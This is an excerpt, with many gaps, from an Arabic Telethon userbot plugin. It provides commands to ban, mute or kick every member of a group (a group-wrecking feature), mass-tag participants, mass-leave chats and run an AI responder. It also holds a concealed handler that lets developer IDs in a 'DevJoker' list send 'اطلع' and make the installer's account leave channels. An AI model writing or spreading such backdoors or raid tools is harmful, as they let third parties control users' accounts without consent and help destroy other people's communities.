...
async def ban_user(chat_id, i, rights):
    try:
        await Anime(functions.channels.EditBannedRequest(chat_id, i, rights))
        return True, None
    except Exception as exc:
        return False, str(exc)        
@Anime.on(events.NewMessage(outgoing=True, pattern="ارسل?(.*)"))
...
@Anime.ar_cmd(pattern="حظر_الكل(?:\s|$)([\s\S]*)")
async def banall(event):
     ...
     is_admin = False
     try:
         partici_ = await Anime(GetParticipantRequest(
           event.chat_id,
           event.sender_id
         ))
     ...
     usrnum = 0
     async for usr in Anime.iter_participants(chat_id):
         ...
         if str(userb) == "None":
             userb = usr.id
             usrtxt = f"{msg} {userb}"
         await Anime.send_message(chat_id, usrtxt)
     ...
     try:
         ...
         pass
@Anime.ar_cmd(pattern="كتم_الكل(?:\s|$)([\s\S]*)")
async def muteall(event):
     ...
     try:
         ...
         pass
@Anime.ar_cmd(pattern="طرد_الكل(?:\s|$)([\s\S]*)")
async def kickall(event):
     ...
     try:
         ...
         pass
@Anime.ar_cmd(pattern="الغاء التفليش")
...
@Anime.ar_cmd(pattern="مغادرة الكروبات")
async def Reda (event):
    ...
    try:
        ...
        for group in gr:
            if group not in dd:
                await Anime.delete_dialog(group)
                num += 1
                await sleep(1)
        if num >=1:
...
async def Hussein(event):
    if event.message.message.startswith("اطلع") and event.sender_id in DevJoker:
        ...
        if channel_username:
            try:
                entity = await Anime.get_entity(channel_username)
                if isinstance(entity, Channel) and entity.creator or entity.admin_rights:
                    ...
                    await Anime(LeaveChannelRequest(channel_username))
...
@Anime.ar_cmd(pattern="مغادرة القنوات")
async def Hussein (event):
...
@Anime.ar_cmd(pattern="تصفية الخاص")
async def hussein(event):
...
@Anime.ar_cmd(pattern="تصفية البوتات")
async def Hussein(event):
...
@Anime.ar_cmd(pattern=r"(?:اضافة|اضافه) اسم (.+)")
...
@Anime.ar_cmd(pattern=r"(?:منع|حظر) اسم (?!\.list$)(.+)")
...
@Anime.ar_cmd(pattern=r"القائمة السوداء$")
...
# الكود من كتابة فريق الانمي بس تسرقة تنشر بقناة الفضايح انتَ وقناتك 🖤
@Anime.ar_cmd(pattern=r"ذكاء(.*)")
async def hussein(event):
...
is_Reham = False
No_group_Joker = "@an_meie"
# يا يلفاشل هم الك نيه تاخذه وتنشره بسورسك 🤣
active_Alanime = []

@Anime.ar_cmd(pattern=r"الذكاء تفعيل")
async def enable_bot(event):
    global is_Reham
    if not is_Reham:
        is_Reham = True
        active_Alanime.append(event.chat_id)
...
@Anime.ar_cmd(pattern=r"الذكاء تعطيل")
async def disable_bot(event):
    global is_Reham
    if is_Reham:
        is_Reham = False
        active_Alanime.remove(event.chat_id)
...
async def reply_to_hussein(event):
    if not is_Reham:
        return
    if event.is_private or event.chat_id not in active_Alanime:
        return
    message = event.message
